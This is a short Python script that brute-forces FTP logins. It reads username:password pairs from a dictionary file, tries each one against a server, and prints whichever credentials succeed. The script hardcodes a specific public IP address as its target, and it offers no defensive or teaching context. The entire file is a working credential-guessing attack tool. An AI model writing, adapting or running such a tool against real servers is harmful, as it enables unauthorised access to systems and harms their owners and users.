import ftplib
import os
import sys


def login_ftp(host, pass_dict):
    with open(pass_dict, "r") as f:
        for ps in f.read().splitlines():
            username = ps.split(":")[0]
            password = ps.split(":")[1]
            try:
                ftp = ftplib.FTP(host)
                ftp.login(username, password)
                print('FTP login \033[1;32;40msuccessful\033[0m!')
                print(username + "----" + password)
                ftp.quit()
                return True
            except:
                print('FTP login \033[1;31;40mfail\033[0m!')


if __name__ == "__main__":
    login_ftp('139.196.182.250', os.path.dirname(sys.argv[0])+'/ftbBL.txt')
